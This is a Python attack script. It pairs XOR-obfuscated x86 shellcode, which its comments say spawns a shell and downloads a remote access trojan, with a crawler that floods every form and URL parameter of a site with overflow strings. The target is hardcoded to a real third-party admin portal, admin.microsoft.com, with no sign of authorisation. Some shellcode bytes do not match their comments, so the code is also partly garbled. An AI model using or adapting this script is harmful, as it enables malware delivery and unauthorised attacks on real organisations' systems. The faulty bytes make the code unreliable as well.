import requests
from bs4 import BeautifulSoup
import urllib.parse
import time

# Example shellcode to download and execute a RAT
original_shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"  # Push "/bin//sh" onto the stack
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"              # Execve syscall to spawn a shell
    b"\x31\xc0\x50\x68\x2e\x2f\x72\x61\x74\x89\xe3\x50\x68"  # Push "./rat" (the RAT filename)
    b"\x2f\x2f\x77\x67\x89\xe3\x50\x68\x6e\x2f\x77\x67\x89"  # Push "wget" (the downloader command)
    b"\xe1\x50\x89\xe2\x50\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80"  # Execve syscall to download the RAT
)

# XOR Encryption key
xor_key = 0xAA

# Encrypt the shellcode using XOR
def xor_encrypt(shellcode, key):
    return bytes([b ^ key for b in shellcode])

# Decrypting stub: This will decrypt the encrypted shellcode at runtime
decryption_stub = (
    b"\xeb\x0e"               # jmp short to start of shellcode
    b"\x5e"                   # pop esi (address of encrypted shellcode)
    b"\x31\xc9"               # xor ecx, ecx (zero out ecx - counter)
    b"\xb1" + bytes([len(original_shellcode)]) +  # mov cl, len(shellcode)
    b"\x80\x36" + bytes([xor_key]) +              # xor byte ptr [esi], key
    b"\x46"                   # inc esi (move to next byte)
    b"\xe2\xfa"               # loop to start of decryption loop
    b"\xeb\x05"               # jmp short to decrypted shellcode start
    b"\xe8\xed\xff\xff\xff"   # call to get the address of the shellcode
)

# Encrypt the original shellcode
encrypted_shellcode = xor_encrypt(original_shellcode, xor_key)

def aggressive_crawl_site(base_url, max_depth=3):
    """Aggressively crawl the site to find all input fields and URL parameters."""
    visited = set()
    to_visit = [(base_url, 0)]
    discovered_entry_points = []
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'}

    while to_visit:
        url, depth = to_visit.pop()
        if url in visited or depth > max_depth:
            continue
        visited.add(url)
        
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all form elements
                forms = soup.find_all('form')
                for form in forms:
                    discovered_entry_points.append(('form', url, form))

                # Find all links to continue crawling
                links = soup.find_all('a', href=True)
                for link in links:
                    full_url = requests.compat.urljoin(url, link['href'])
                    if full_url not in visited and full_url.startswith(base_url):
                        to_visit.append((full_url, depth + 1))
                    # Treat links with query parameters as potential injection points
                    if '?' in full_url:
                        discovered_entry_points.append(('url', full_url, None))

        except requests.exceptions.Timeout:
            print(f"Timeout while crawling {url}. Skipping...")
        except Exception as e:
            print(f"Failed to crawl {url}: {e}")

    return discovered_entry_points

def inject_payloads(entry_points):
    """Inject buffer overflow payloads into discovered entry points."""
    payload = "A" * 1024  # Example large payload to test for overflow
    
    for entry_type, url, form in entry_points:
        if entry_type == 'form':
            # Prepare form data with the large payload
            form_data = {}
            action = form.get('action')
            method = form.get('method', 'get').lower()

            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                if name:
                    form_data[name] = payload

            target_url = requests.compat.urljoin(url, action)
            try:
                if method == 'post':
                    response = requests.post(target_url, data=form_data)
                else:
                    response = requests.get(target_url, params=form_data)

                # Only output if the response status code is 200
                if response.status_code == 200:
                    print(f"Received 200 OK from {target_url} with payload size {len(payload)}.")
                    print(f"Response code: {response.status_code}")
                    print(response.text[:200])  # Print a snippet of the response for context

            except Exception as e:
                print(f"Error testing form at {target_url}: {e}")

        elif entry_type == 'url':
            # Append the payload to each parameter in the URL
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            for param in query_params:
                original_value = query_params[param][0]
                query_params[param] = payload  # Overwrite each parameter with the payload

                new_query = urllib.parse.urlencode(query_params, doseq=True)
                target_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

                try:
                    response = requests.get(target_url)
                    # Only output if the response status code is 200
                    if response.status_code == 200:
                        print(f"Received 200 OK from {target_url} with payload size {len(payload)}.")
                        print(f"Response code: {response.status_code}")
                        print(response.text[:200])  # Print a snippet of the response for context

                except Exception as e:
                    print(f"Error testing URL {target_url}: {e}")

def run_tests_on_targets(targets):
    """Crawl and test multiple targets (domains or specific URLs) for potential buffer overflow vulnerabilities."""
    for target in targets:
        print(f"\nTesting target: {target}")
        if target.startswith('http://') or target.startswith('https://'):
            base_url = target
        else:
            base_url = f"https://{target}"

        entry_points = aggressive_crawl_site(base_url)
        print(f"Found {len(entry_points)} potential entry points on {target}")
        inject_payloads(entry_points)

# List of domains or specific URLs to test
target_list = [
    "https://admin.microsoft.com/"  # Example URL
]

# Run the tests on the list of targets
run_tests_on_targets(target_list)
